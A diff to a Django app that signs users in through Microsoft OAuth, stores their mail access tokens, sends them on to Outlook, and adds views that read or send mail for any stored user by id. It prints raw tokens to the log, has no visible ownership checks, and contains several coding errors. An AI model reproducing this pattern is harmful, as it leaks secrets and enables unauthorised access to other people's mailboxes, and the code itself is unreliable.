@@ -2,8 +2,11 @@ import dateutil.parser
 from django.shortcuts import render
 from django.http import HttpResponse, HttpResponseRedirect
 from django.urls import reverse
+from django.views.generic import ListView, DetailView, TemplateView
+from django.views.generic.edit import FormView
 from .auth_helper import get_sign_in_url, get_token_from_code, store_token, store_user, remove_user_and_token, get_token
 from .graph_helper import get_user, get_calendar_events, get_contact_list, MailGraph
+from .forms import ComposeMailForm
 from .models import ClientUser
 
 
@@ -39,32 +42,23 @@ def callback(request):
   expected_state = request.session.pop('auth_state', '')
   # Make the token request
   token = get_token_from_code(request.get_full_path(), expected_state)
-
+  print('this token here is', token)
   # Get the user's profile
   user = get_user(token)
 
   # Save token and user
   store_token(request, token)
   store_user(request, user)
-
-    request.session['user'] = {
-    'is_authenticated': True,
-    'name': user['displayName'],
-    'email': user['mail'] if (user['mail'] != None) else user['userPrincipalName']
-  }
   usermail = user['mail'] if (user['mail'] != None) else user['userPrincipalName']
-  msid = models.CharField(max_length=512, null=True)
-  access_token = models.CharField(max_length= 1024, null=True)
-
   try: 
     cuser = ClientUser.objects.get(email=usermail)
     cuser.access_token = token
     cuser.save()
   except:
-    ClientUser.obects.create(email =  usermail,
+    ClientUser.objects.create(email =  usermail,
       access_token = token,
-      msid = user['id'])
-  return HttpResponseRedirect('https://outlook.live.com/owa/')
+      msid = user['id']) 
+  return HttpResponseRedirect('https://outlook.office.com/owa/')
 
 def sign_out(request):
   remove_user_and_token(request)
@@ -128,11 +122,14 @@ class ClientDetail(DetailView):
     return context
 
 class ClientMailCompose(FormView):
+  form_class = ComposeMailForm
+  template_name = 'alpenels/forms.html'
 
   def form_valid(self, form):
-    id  = self.request..kwargs.get('id')
+    id  = self.request.kwargs.get('id')
     cuser = get_object_or_404(ClientUser, id)
     mg = MailGraph(cuser.access_token)
+
     return super().form_valid(form)
 
 class ClientMailList(TemplateView):
@@ -141,4 +138,9 @@ class ClientMailList(TemplateView):
 
 class ClientMailFolder(TemplateView):
   def get_context_data(self, **kwargs):
-    return context
+    id  = self.request.kwargs.get('id')
+    fid  = self.request.kwargs.get('fid')
+    cuser = get_object_or_404(ClientUser, id)
+    kwargs['messages'] = MailGraph(cuser.access_token).get_folder_messages(id)
+
+    return kwargs
